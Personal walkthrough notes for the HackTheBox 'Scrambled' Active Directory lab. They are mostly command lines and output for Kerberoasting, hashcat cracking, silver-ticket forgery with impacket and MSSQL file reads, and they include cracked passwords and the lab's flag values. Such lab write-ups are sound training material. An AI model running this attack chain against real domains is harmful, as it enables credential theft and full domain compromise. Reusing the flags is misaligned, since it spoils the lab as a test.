# Enum
### Nmap
```bash
awk -F: '{print $2}' rustscan.txt | paste -sd ","
53,80,88,135,139,389,445,464,593,636,1433,3268,3269,4411,5985,9389,49667,49673,49674,49689,49700,49712

sudo nmap -sC -sV -oA nmap -p 53,80,88,135,139,389,445,464,593,636,1433,3268,3269,4411,5985,9389,49667,49673,49674,49689,49700,49712 $IP -v
```

4411/tcp  open  found? <- Used by Sales Orders App

### Web
* http://scrm.local/support.html
* http://scrm.local/salesorders.html
* http://scrm.local/supportrequest.html

```html
<html>
<body>
<h1>News And Alerts</h1>	
04/09/2021: Due to the security breach last month we have now disabled all NTLM authentication on our network. This may cause problems for some of the programs you use so please be patient while we work to resolve any issues

<h1>Password Resets</h1>

Our self service password reset system will be up and running soon but in the meantime please call the IT support line and we will reset your password. If no one is available please leave a message stating your username and we will reset your password to be the same as the username. 

<h1>ksimpson</h1>	

support@scramblecorp.com
</html>
```

### LDAP
`-x         Simple authentication`

```bash
ldapsearch -H ldap://scrm.local -x -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingcontexts: DC=scrm,DC=local
namingcontexts: CN=Configuration,DC=scrm,DC=local
namingcontexts: CN=Schema,CN=Configuration,DC=scrm,DC=local
namingcontexts: DC=DomainDnsZones,DC=scrm,DC=local
namingcontexts: DC=ForestDnsZones,DC=scrm,DC=local

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1

ldapsearch -H ldap://scrm.local -x -b "dc=scrm,dc=local"
# extended LDIF
#
# LDAPv3
# base <dc=scrm,dc=local> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v4563
```

# Shell as MiscSv
### SMB
`smbmap -H $IP -u null -p ''` found nothing.

* https://0xdf.gitlab.io/2022/10/01/htb-scrambled-linux.html

Because NTLM authentication is disabled, I won’t be able to use many of the standard tools here, and I won’t be able to access any service by IP address if it requires authentication.

```bash
smbclient -N -L \\\\$IP
session setup failed: NT_STATUS_NOT_SUPPORTED

crackmapexec smb $IP -u null -p ''
SMB         10.129.37.130   445    10.129.37.130    [*]  x64 (name:10.129.37.130) (domain:10.129.37.130) (signing:True) (SMBv1:False)
SMB         10.129.37.130   445    10.129.37.130    [-] 10.129.37.130\null: STATUS_NOT_SUPPORTED
```

### AS-REP roasting failed
```bash
impacket-GetNPUsers -dc-ip dc1.scrm.local -usersfile usernames_mock scrm.local/
Impacket v0.11.0 - Copyright 2023 Fortra

[-] User ksimpson doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Luckily passwords are reset to be the username

### Kerberos auth again save the day
```bash
impacket-smbclient 'scrm.local/ksimpson:ksimpson@dc1.scrm.local' -k

impacket-smbclient 'scrm.local/ksimpson:ksimpson@dc1.scrm.local' -k -no-pass
Impacket v0.11.0 - Copyright 2023 Fortra

[-] CCache file is not found. Skipping...
Type help for list of commands
# help

 open {host,port=445} - opens a SMB connection against the target host/port
 login {domain/username,passwd} - logs into the current SMB connection, no parameters for NULL connection. If no password specified, it'll be prompted
 kerberos_login {domain/username,passwd} - logs into the current SMB connection using Kerberos. If no password specified, it'll be prompted. Use the DNS resolvable domain name
 login_hash {domain/username,lmhash:nthash} - logs into the current SMB connection using the password hashes
 logoff - logs off
 shares - list available shares

# shares
ADMIN$
C$
HR
IPC$
IT
NETLOGON
Public
Sales
SYSVOL

# use public
# ls
drw-rw-rw-          0  Fri Nov  5 11:23:19 2021 .
drw-rw-rw-          0  Fri Nov  5 11:23:19 2021 ..
-rw-rw-rw-     630106  Sat Nov  6 06:45:07 2021 Network Security Changes.pdf
# get Network Security Changes.pdf
```

### Kerberoast 
* https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast#linux
* https://www.thehacker.recipes/ad/movement/kerberos/kerberoast

`impacket-GetUserSPNs -request -dc-ip dc1.scrm.local scrm.local/ksimpson:ksimpson -outputfile ksimpson_hashes.kerberoast` # Password will be prompted if without `:password`

```bash
impacket-GetUserSPNs -request -dc-ip dc1.scrm.local scrm.local/ksimpson:ksimpson -outputfile ksimpson_hashes.kerberoast -k -dc-host dc1.scrm.local
Impacket v0.11.0 - Copyright 2023 Fortra

[-] CCache file is not found. Skipping...
[-] CCache file is not found. Skipping...
ServicePrincipalName          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation 
----------------------------  ------  --------  --------------------------  --------------------------  ----------
MSSQLSvc/dc1.scrm.local:1433  sqlsvc            2021-11-04 05:32:02.351452  2023-11-27 12:38:28.276706             
MSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-04 05:32:02.351452  2023-11-27 12:38:28.276706
```

```bash
mv ksimpson_hashes.kerberoast mssql-svc.hash
hashcat mssql-svc.hash /usr/share/wordlists/rockyou.txt

Pegasus60
```

##### Alternative windows way
* https://0xdf.gitlab.io/2022/10/01/htb-scrambled-win.html#kerberoast

### MSSQL Access
* https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/silver

A Silver Ticket is a forged TGS (Ticket Granting Service) ticket, which is used directly between the client and the service, without necessarily going to the DC. Instead, the TGS ticket is signed by the service account itself, and thus the Silver Ticket is limited to authenticating only the service itself.

```bash
# Find the domain SID
### * https://www.browserling.com/tools/ntlm-hash
### * https://blog.atucom.net/2012/10/generate-ntlm-hashes-via-command-line.html
iconv -f ASCII -t UTF-16LE <(printf "Pegasus60") | openssl dgst -md4
impacket-lookupsid -hashes ':b999a16500b87d17ec7f2e2a68778f05' 'scrm.local/sqlsvc@dc1.scrm.local' 0 <- wont work since diabled. Not accepting the Kerberos either. But Alvin made it working.

python examples/lookupsid.py 'scrm.local/sqlsvc@dc1.scrm.local' 0 -no-pass -k
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Brute forcing SIDs at dc1.scrm.local
[*] StringBinding ncacn_np:dc1.scrm.local[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-2743207045-1827831105-2542523200

* https://morgansimonsen.com/2012/05/21/whats-special-about-the-builtin-administrator-account-12/

impacket-getTGT scrm.local/sqlsvc:Pegasus60 -dc-ip dc1.scrm.local
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Saving ticket in sqlsvc.ccache
export KRB5CCNAME=sqlsvc.ccache

ldapsearch -H ldap://dc1.scrm.local -D 'scrm.local\sqlsvc' -Y GSSAPI -b "cn=users,dc=scrm,dc=local" | grep -i "objectSid::" | cut -d ":" -f3
SASL/GSSAPI authentication started
SASL username: sqlsvc@SCRM.LOCAL
SASL SSF: 256
SASL data security layer installed.
 AQUAAAAAAAUVAAAAhQSCo0F98mxA04uX9gEAAA==

Otherwise convert it * https://devblogs.microsoft.com/oldnewthing/20040315-00/?p=40253

# with an NT hash
export NThash='b999a16500b87d17ec7f2e2a68778f05'
export DomainSID='S-1-5-21-2743207045-1827831105-2542523200'
export DOMAIN='scrm.local'
export SPN='MSSQLSvc/dc1.scrm.local'
export Username='sqlsvc'
/usr/share/doc/python3-impacket/examples/ticketer.py -nthash $NThash -domain-sid $DomainSID -domain $DOMAIN -spn $SPN $Username

Impacket v0.11.0 - Copyright 2023 Fortra

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for scrm.local/sqlsvc
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in sqlsvc.ccache  <- I should add Administrator at the bottome of the previous command since Admin.ccache instead

impacket-mssqlclient -k scrm.local
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Encryption required, switching to TLS
[-] Kerberos SessionError: KDC_ERR_PREAUTH_FAILED(Pre-authentication information was invalid)
impacket-mssqlclient -k dc1.scrm.local
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC1): Line 1: Changed database context to 'master'.
[*] INFO(DC1): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (SCRM\administrator  dbo@master)>
```

### MSSQL Enum
```bash
SQL (SCRM\administrator  dbo@master)> SELECT SYSTEM_USER;
                     
------------------   
SCRM\administrator   

SQL (SCRM\administrator  dbo@master)> SELECT IS_SRVROLEMEMBER('sysadmin');
    
-   
1   

SQL (SCRM\administrator  dbo@master)> SELECT CURRENT_USER;
      
---   
dbo   

SQL (SCRM\administrator  dbo@master)> select @@version;
                                                                                                                                                                                                                           
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   
Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64) 
        Sep 24 2019 13:48:23 
        Copyright (C) 2019 Microsoft Corporation
        Express Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64> (Build 17763: ) (Hypervisor)
   

SQL (SCRM\administrator  dbo@master)> select user_name();
      
---   
dbo   

SQL (SCRM\administrator  dbo@master)> SELECT name FROM master.dbo.sysdatabases;
name         
----------   
master       

tempdb       

model        

msdb         

ScrambleHR   

SQL (SCRM\administrator  dbo@master)> SELECT name, database_id FROM sys.databases;
name         database_id   
----------   -----------   
master                 1   

tempdb                 2   

model                  3   

msdb                   4   

ScrambleHR             5

SQL (SCRM\administrator  dbo@master)> SELECT TABLE_NAME FROM ScrambleHR.INFORMATION_SCHEMA.TABLES;
TABLE_NAME   
----------   
Employees    

UserImport   

Timesheets   

SQL (SCRM\administrator  dbo@master)> SELECT * from ScrambleHR.dbo.UserImport;
LdapUser   LdapPwd             LdapDomain   RefreshInterval   IncludeGroups   
--------   -----------------   ----------   ---------------   -------------   
MiscSvc    ScrambledEggs9900   scrm.local                90               0

SQL (SCRM\administrator  dbo@master)> SELECT BulkColumn FROM OPENROWSET(BULK 'C:\users\administrator\desktop\root.txt', SINGLE_CLOB) MyFile
BulkColumn                                
---------------------------------------   
b'04049384ac7ea46e9206aaa22b217606\r\n'   

SQL (SCRM\administrator  dbo@master)> SELECT BulkColumn FROM OPENROWSET(BULK 'C:\users\miscsvc\desktop\user.txt', SINGLE_CLOB) MyFile
BulkColumn                                
---------------------------------------   
b'01f67f1fb5da56603a59c6a7178de6d1\r\n' 
```

* https://0xdf.gitlab.io/2022/10/01/htb-scrambled-beyond-root.html#
* https://www.mssqltips.com/sqlservertip/1643/using-openrowset-to-read-large-files-into-sql-server/

# Awesome potato
* https://0xdf.gitlab.io/2022/10/01/htb-scrambled-beyond-root.html#roguepotato